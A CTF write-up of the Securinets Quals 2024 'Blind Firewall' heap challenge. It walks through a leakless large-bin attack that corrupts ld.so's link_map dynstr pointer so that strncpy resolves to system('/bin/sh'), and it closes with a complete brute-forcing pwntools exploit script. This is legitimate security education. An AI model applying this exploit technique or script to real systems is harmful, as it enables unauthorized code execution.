---
layout: post
title: Blind Firewall | Securinets Quals 2024
description: heap challenge
tags: pwn heap linker leakless
---

this is a heap challenge that ended with 1 solve and i had the pleasure to first blood it . the challenge runs on libc 2.35 which means its a modern heap exploit .

lets check the protections on the binary .

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Everything seems in place except for that `Partial Relro` . We will come back to it later .

now lets break down the program .

```c
printf("Your ID: %d/n", ((unsigned __int64)&puts >> 12) & 0xF);
  while ( 1 )
  {
    v4 = menu();
    switch ( v4 )
    {
      case 1:
        add_rule();
        break;
      case 2:
        edit_rule();
        break;
      case 3:
        delete_rule();
        break;
      case 4:
        show_rule();
        break;
      case 5:
        copy_rule();
        break;
      case 6:
        link_rules();
        break;
      case 7:
        setup_in_data();
        break;
      case 8:
        setup_out_data();
        break;
      default:
        break;
    }
    if ( v4 == 9 )
      exit(0);
  }
```

lets start by the first leak , which is the 4th lower nibble of the puts function . With good math we can deduce the first 2 bytes of the libc base address . this leak gives us a hint that we might need to brute force later and the author gave us this leak so we take it easy on the servers xD .

aside from that , looks like your usual heap menu with extra functions . We cool ? no . lets take down the show function xD

```c
void show_rule()
{
  ;
}
```

actually after this printf instruction , your program will not see the light and not a single character will be printed . this takes away an attack vector which is `FSOP to stdout for leak into RCE` . lets continue .

## add_rule()

- we have 11 chunks , although the array size is of size 10 , and the last pointer is in the sizes array , it doesnt matter because we can already overflow into other chunks as we will see .
- we can only allocate betwenn 0x4ff and 0x800 , so no tcache xD . which only leaves with large bins attaque and maybe some backwards/forwards consolidations attaque .
- size is saved in an array and no obvious overflows

```c
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0xA )
  {
    __isoc99_scanf("%d", &v2);
    if ( v2 > 1279 && v2 <= 2048 )
    {
      v3 = (char *)malloc(v2 + 32LL);
      *((_QWORD *)&rules + 2 * (int)v1) = v3;
      qword_40C8[2 * (int)v1] = v3 + 32;s
      sizes[v1] = v2;
    }
  }

```

## delete_rule()

- neither the pointer for the chunks nor its size were cleared from the arrays >>>>> UAF .
- no OOB , so no weird freeings random pointers .

```c
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0xA )
    free(*((void **)&rules + 2 * (int)v1));

```

## edit_rule()

- the pointer we write into is malloc()+0x20 which is useless for our UAF as it doesnt write any metadata .
- might be of use later (i know it is , just dont wanna spoil xD)

```c
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0xA )
    read(0, (void *)qword_40C8[2 * (int)v1], (unsigned int)sizes[v1]);
```

## copy_rule()

- very weird function , not only useless because we copy into malloc()+0x20 which is useless , also because we can already write to both of them .
- we will need this later .

```c
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0xA )
  {
    __isoc99_scanf("%d", &v2);
    if ( v2 <= 0xA && v2 != v1 && *((_QWORD *)&rules + 2 * (int)v1) && *((_QWORD *)&rules + 2 * (int)v2) )
      strncpy((char *)qword_40C8[2 * (int)v2], (const char *)qword_40C8[2 * (int)v1], (int)sizes[v2]);
  }

```

## link_rules()

- we copy the first value of a rule ( pointer[0] ) into the 4th value ( pointer[3] ) . this confirms our large bin attaque vector
- usually the pointer[3] that we overwrite for the large bin attaque is a heap pointer which is useless . we can solve that by replacing it with a libc value from pointer[0] or pointer[1] with this function .

```c
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0xA )
  {
    __isoc99_scanf("%d", &v2);
    if ( v2 <= 0xA )
      *(_QWORD *)(*((_QWORD *)&rules + 2 * (int)v2) + 24LL) = **((_QWORD **)&rules + 2 * (int)v1);
  }

```

## setup_in_data() and setup_out_data()

- 0 <= v1 <4 . which means we can partially overwrite our pointers seperately .

```c
read(0, *((void **)&rules + 2 * (int)v1), 8uLL);
```

# RECAP

0. its nearly impossible to get a leak , of any kind.
1. we cannot allocate into tcache nor fast nor small bins : 0x500<= size <=0x800
2. window for large bin attaque confirmed and with libc pointer that we can partially overwrite and be put in `bk_nextsize` . for more reading on large bin attacks if youre not familiar with it . [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c)
3. we have full write on a chunk using both : edit , setup_in_data() and setup_out_data() .
4. we have the 2 lowers bytes of libc.address so that makes partial writing easier and not brute-forceable for close to libc pointers.

we are done with recon , so now we need to choose a good target for our large bin attaque

# EXPLOITATION

for some reason , at least from what i see , there still hasnt been a reliable target , that when overwritten with heap value like in our case , can be chained into an RCE primitive . here are some targets i saw in past CTF's :

- printf_arginfo_table and printf_function_table like in [house of husk](https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507) . but this needs to be paired with a good one_gadget (not the case ) and printf("%someformat") to begin with xD . PASS .

- global_max_fast . its still viable in 2.35 as the value is still considered as long (in recent version it's a byte ) . This one looked promising in the start as we can juggle pointers around and partially overwrite them , and the restriction on the size when allocating will be useless as all chunks will be considered as fast bin chunks . it was all fun until i stumbled on the fact that even the fd_pointer in fast bins are protected by safe linking xD (the pointered are XORed) .

- writing into tcache_per_thread struct in the TLS . this would be useless as no tcache size is allocated .

at this point i run out of ideas and i questionned my existence . but somehow i remembered that the author Mongi , who is my friend irl , loves the linker - for some reason xD - , and it wasnt long ago that i figured out that the offset between the ld.so base and the libc.so is fixed (depends on the filesystem) . if it doesnt work remotely its most likely because the patchelf (whether you run it manually or using pwninit) fucks that up . you can install gdb in the docker and get that offset . And just like that a new map has been unlocked .

I've been familiar with some linker exploitation , mostly with playing around with exit handlers pointers and some `DT_FINI` `FINI_ARRAY` shit ... i also new about the `link_map` structures in the linker and their roles . these structs are mostly used for example when **our binary wants to resolve a libc function** . how useless ! now hold on a second , did you just say resolving functions ? when our binary is `Partial Relro` ??? thats when it clicked and i knew i was in the right path (at least the intended one xD) .

lets take a quick stepback and understand the resolving process . For _Partial Relro_ , the function is resolved from libc when it is first called (in full relro it is done at startup ) . This process is done via the PLT stub that behind the scenes just calls the `_dl_fixup` function . so lets take a quick look at it . I'm just keeping the interesting parts .

```c

_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
	   struct link_map *l, ElfW(Word) reloc_arg){
  ...

  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
  const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL])
		      + reloc_offset (pltgot, reloc_arg));
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);

  ...

```

if you are familiar with the ret2dlresolve technique , then you might already be familiar with this piece of code . If not , this [ret2dlresolve](https://syst3mfailure.io/ret2dl_resolve/) might make an interesting read .
For the sake of this writeup , i'll just explain what is necessary . Well , the \_dl_fixup resolves the right function based on strings . yes strings !!!! when it wants to resolve the function 'system' there is string somewhere thats has 'system' that will decide that that function will be resolved .

all the code in the \_dl_fixup is trying to locate the position of the right string of the function in this section that is called `.dynstr`

```python
gef➤  info files
Symbols from "/home/kali/Desktop/CTFs/quals_2024/pwn/blind_firewall/player/main".
Local exec file:
        `/home/kali/Desktop/CTFs/quals_2024/pwn/blind_firewall/player/main', file type elf64-x86-64.
        Entry point: 0x1170
        0x0000000000000318 - 0x0000000000000334 is .interp
        0x0000000000000338 - 0x0000000000000368 is .note.gnu.property
        0x0000000000000368 - 0x000000000000038c is .note.gnu.build-id
        0x000000000000038c - 0x00000000000003ac is .note.ABI-tag
        0x00000000000003b0 - 0x00000000000003e8 is .gnu.hash
        0x00000000000003e8 - 0x00000000000005b0 is .dynsym
        0x00000000000005b0 - 0x00000000000006b2 is .dynstr
        0x00000000000006b2 - 0x00000000000006d8 is .gnu.version
        0x00000000000006d8 - 0x0000000000000728 is .gnu.version_r
        0x0000000000000728 - 0x0000000000000848 is .rela.dyn
        0x0000000000000848 - 0x0000000000000920 is .rela.plt
        0x0000000000001000 - 0x000000000000101b is .init
        0x0000000000001020 - 0x00000000000010c0 is .plt
        0x00000000000010c0 - 0x00000000000010e0 is .plt.got
        0x00000000000010e0 - 0x0000000000001170 is .plt.sec
        0x0000000000001170 - 0x0000000000001a4e is .text
        0x0000000000001a50 - 0x0000000000001a5d is .fini
        0x0000000000002000 - 0x00000000000020e8 is .rodata
        0x00000000000020e8 - 0x0000000000002174 is .eh_frame_hdr
        0x0000000000002178 - 0x0000000000002380 is .eh_frame
        0x0000000000003de0 - 0x0000000000003de8 is .init_array
        0x0000000000003de8 - 0x0000000000003df0 is .fini_array
        0x0000000000003df0 - 0x0000000000003fd0 is .dynamic
        0x0000000000003fd0 - 0x0000000000004000 is .got
        0x0000000000004000 - 0x0000000000004060 is .got.plt
        0x0000000000004060 - 0x0000000000004070 is .data
        0x0000000000004080 - 0x0000000000004188 is .bss
gef➤  x/20s 0x00000000000005b0
0x5b0:  ""
0x5b1:  "__cxa_finalize"
0x5c0:  "read"
0x5c5:  "malloc"
0x5cc:  "__libc_start_main"
0x5de:  "setvbuf"
0x5e6:  "stdout"
0x5ed:  "puts"
0x5f2:  "free"
0x5f7:  "strncpy"
0x5ff:  "stdin"
0x605:  "__isoc99_scanf"
0x614:  "stderr"
0x61b:  "exit"
0x620:  "__stack_chk_fail"
0x631:  "printf"
0x638:  "libc.so.6"
0x642:  "GLIBC_2.7"
0x64c:  "GLIBC_2.4"
0x656:  "GLIBC_2.34"

```

Usually , the section is r - - . So we cant overwrite for example the string 'printf' with 'system .

well if you dive into the macros you will realise that the binary doesnt keep a straight-forward pointer to this _strtab_ section , it gets it from the _.dynamic_ section
For quick recap , the .dynamic holds either pointers or offsets to every section in the shared object (in our case the binary itself) , like got , got.plt , dynstr , .....

```python
0x00005555555545b0 - 0x00005555555546b2 is .dynstr
...
0x0000555555557df0 - 0x0000555555557fd0 is .dynamic
...

gef➤  x/40gx 0x0000555555557df0
0x555555557df0: 0x0000000000000001      0x0000000000000088
0x555555557e00: 0x000000000000000c      0x0000000000001000
0x555555557e10: 0x000000000000000d      0x0000000000001a50
0x555555557e20: 0x0000000000000019      0x0000000000003de0
0x555555557e30: 0x000000000000001b      0x0000000000000008
0x555555557e40: 0x000000000000001a      0x0000000000003de8
0x555555557e50: 0x000000000000001c      0x0000000000000008
0x555555557e60: 0x000000006ffffef5      0x00005555555543b0
0x555555557e70: 0x0000000000000005      0x00005555555545b0
0x555555557e80: 0x0000000000000006      0x00005555555543e8
0x555555557e90: 0x000000000000000a      0x0000000000000102
0x555555557ea0: 0x000000000000000b      0x0000000000000018
0x555555557eb0: 0x0000000000000015      0x00007ffff7ffe108
0x555555557ec0: 0x0000000000000003      0x0000555555558000
0x555555557ed0: 0x0000000000000002      0x00000000000000d8
0x555555557ee0: 0x0000000000000014      0x0000000000000007
0x555555557ef0: 0x0000000000000017      0x0000555555554848
0x555555557f00: 0x0000000000000007      0x0000555555554728
0x555555557f10: 0x0000000000000008      0x0000000000000120
0x555555557f20: 0x0000000000000009      0x0000000000000018
gef➤  x/20s 0x00005555555545b0
0x5555555545b0: ""
0x5555555545b1: "__cxa_finalize"
0x5555555545c0: "read"
0x5555555545c5: "malloc"
0x5555555545cc: "__libc_start_main"
0x5555555545de: "setvbuf"
0x5555555545e6: "stdout"
0x5555555545ed: "puts"
0x5555555545f2: "free"
0x5555555545f7: "strncpy"
0x5555555545ff: "stdin"
0x555555554605: "__isoc99_scanf"
0x555555554614: "stderr"
0x55555555461b: "exit"
0x555555554620: "__stack_chk_fail"
0x555555554631: "printf"
0x555555554638: "libc.so.6"
0x555555554642: "GLIBC_2.7"
0x55555555464c: "GLIBC_2.4"
0x555555554656: "GLIBC_2.34"

```

well we cant overwrite this section as well because it's r - - . I mean even if we wanted , you the chance of you becoming a millionaire tomorrow is way higher than you getting a PIE leak xD .

So we have to dig deeper into those macros . it turns out that the \_dl*fixup gets the right pointer inside .dynamic is because there is a pointer in the \_link_map* structure thats tells it where is the pointer that points to dynstr inside the .dynamic

for debugging purposes , the link*map address can be found inside the *\_r*debug* structure

```python

gef➤  x/4gx &_r_debug
0x7ffff7ffe108 <_r_debug>:      0x0000000000000001      0x00007ffff7ffe2c0
0x7ffff7ffe118 <_r_debug+16>:   0x00007ffff7fcd510      0x0000000000000000
gef➤  x/20gx 0x00007ffff7ffe2c0
0x7ffff7ffe2c0: 0x0000555555554000      0x00007ffff7ffe888
0x7ffff7ffe2d0: 0x0000555555557df0      0x00007ffff7ffe890
0x7ffff7ffe2e0: 0x0000000000000000      0x00007ffff7ffe2c0
0x7ffff7ffe2f0: 0x0000000000000000      0x00007ffff7ffe870
0x7ffff7ffe300: 0x0000000000000000      0x0000555555557df0
0x7ffff7ffe310: 0x0000555555557ed0      0x0000555555557ec0
0x7ffff7ffe320: 0x0000000000000000      0x0000555555557e70
0x7ffff7ffe330: 0x0000555555557e80      0x0000555555557f00
0x7ffff7ffe340: 0x0000555555557f10      0x0000555555557f20
0x7ffff7ffe350: 0x0000555555557e90      0x0000555555557ea0
gef➤  x/2gx 0x0000555555557e70
0x555555557e70: 0x0000000000000005      0x00005555555545b0
gef➤  x/20s 0x00005555555545b0
0x5555555545b0: ""
0x5555555545b1: "__cxa_finalize"
0x5555555545c0: "read"
0x5555555545c5: "malloc"
0x5555555545cc: "__libc_start_main"
0x5555555545de: "setvbuf"
0x5555555545e6: "stdout"
0x5555555545ed: "puts"
0x5555555545f2: "free"
0x5555555545f7: "strncpy"
0x5555555545ff: "stdin"
0x555555554605: "__isoc99_scanf"
0x555555554614: "stderr"
0x55555555461b: "exit"
0x555555554620: "__stack_chk_fail"
0x555555554631: "printf"
0x555555554638: "libc.so.6"
0x555555554642: "GLIBC_2.7"
0x55555555464c: "GLIBC_2.4"
0x555555554656: "GLIBC_2.34"
gef➤  vmmap 0x7ffff7ffe2c0
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2

```

yes that value will be our target for the large bin attaque . we will forge a new pointers chain so that when a function gets resolved , it will have the 'system' function gets called . but what is this function ??

Do you remember the weird _COPY_RULES()_ function ? . it calls the _stncpy_ function with a pointer that we can put "/bin/sh" inside it using the _edit()_ function .
so when it gets called , what actually gets called is system("/bin/sh").

# PLAN

1. setup the heap for our large bin attaque
2. we swap a libc pointer into the _bk_nextsize_ then paritally overwrite it to be at &link_map + 0x68 - 0x20 (we brute force the third lowest byte) .
3. now lets suppose 0x1000 is the heap pointer written where we wanted , we need to write another heap pointer in 0x1008 as this will be the pointer to the forged _dynstr_ section .
4. one unfortunate thing is that the heap value written is malloc()-0x10 , so we cant just use _link_rules()_ to put a heap value there . For that we need to get back to step 1 and have some more heap setups .
   What i did was i prepared a chunk at 0x1000-0x10 to be freed and put into unsorted bin when i need it to , and have a heap pointer . you will see some spraying in my solver because things got so messy .
5. once all of this is done , just calculate the offset of the string 'strncpy' from the beggining of the strtab and forge your own in the pointer you wrote in step 4 . in our case its 0x47 .

6. write "/bin/sh" in some chunk then use the copy_rule on it . So instead of strncpy("/bin/sh",...) >>>> system("/bin/sh") gets called .

# Conclusion

it was a very unique heap challenge , although the bruteforcing on remote took a toll on me as i had no way of debugging (no output in the whole program xD) .
It pushed me to my limits and i ended up learning a lot . Kudos to the author Mongi . the solver below might be very non-chalant to you but whatever gets the job done .

if you reached this point , hope you had a great and informative read .

# solver

```python
#!/usr/bin/python3

from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        x/40gx &rules
                        b* copy_rule+275
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main_patched")
libc=ELF("./libc.so.6")
nc="nc 34.165.180.62 5001"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

def malloc(index,size):   # between 0x500 and 0x800
        p.sendline("1")
        p.sendline(str(index))
        p.sendline(str(size))

def free(index):
        p.sendline("3")
        p.sendline(str(index))

def setin(index,payload1:bytes,payload2:bytes):
        p.sendline("7")
        p.sendline(str(index).encode())
        p.send(payload1)
        sleep(0.5)
        p.send(payload2)
        sleep(0.5)

def setout(index,payload1:bytes,payload2:bytes):
        p.sendline("8")
        p.sendline(str(index).encode())
        p.send(payload1)
        sleep(0.5)
        p.send(payload2)
        sleep(0.5)

def link(rule1,rule2):
        p.sendline("6")
        p.sendline(str(rule1).encode())
        p.sendline(str(rule2).encode())

def edit(index,payload,newline=False):
        p.sendline("2")
        p.sendline(str(index).encode())
        if newline:
                p.sendline(payload[:-1])
                sleep(1)
        else:
                p.send(payload)
                sleep(1)
############### main exploit    ###############
#p.close()
while True:

        try :
                p=remote(host,port)
                p.recvuntil("Your ID: ")
                leak=int(p.recvline()[:-1])
                guess=(leak<<12) + 0x328+0x9000+0x5d0000
                print(hex(guess))


                malloc(0,0x520) # vuln
                edit(0,b"a"*(0x47-0x30)+b"system\x00")

                malloc(8,0x800)
                free(8)

                malloc(5,0x500)
                malloc(6,0x500)  # this one overwrites smaller-0x10


                free(5)
                free(6)
                malloc(10,0x520) # for consolidation
                malloc(1,0x510)  # smaller

                malloc(3,0x800) #for consolidation
                edit(3,(p64(0)+p64(0x101))*(0x300//16))

                free(0)
                malloc(9,0x800) # to push 0 to large bin

                link(0,0)
                #guess=b""
                setout(0,b"\x90",p32(guess)[:3])


                free(1)
                #debug()
                malloc(10,0x800) # to push 1 to large bin

                malloc(7,0x800)  # just to free 10 later


                edit(9,(p64(0)+p64(0x101))*(0x800//16),True)
                sleep(0.5)
                edit(8,b"a"*0x500+p64(0)+p64(0x701)+b"a",True)
                #pause()
                sleep(0.5)
                free(10)
                free(6)
                link(6,6)

                edit(10,b"/bin/sh\x00"+b"a"*(0x47-0x30-8)+b"system\x00\x00",True)
                sleep(0.5)
                #pause()

                edit(7,"/bin/sh\x00\x00",True)

                p.sendline("5".encode())
                p.sendline(b"10")
                p.sendline(b"7")

                sleep(0.5)
                #p.interactive()
                p.sendline(b"ls / ; cat /fla*")
                sleep(0.5)
                msg=p.recv()
                print("------------------------------")
                log.info(msg)
                print("------------------------------")
                if b"app" in msg:
                        print(msg)
                        exit(1)

                p.interactive()

        except KeyboardInterrupt:
                print("bye")
                exit(0)
        except :
                pass
        finally :
                p.close()

```

![flag](/assets/posts/Securinets_quals_2024/flag.png)
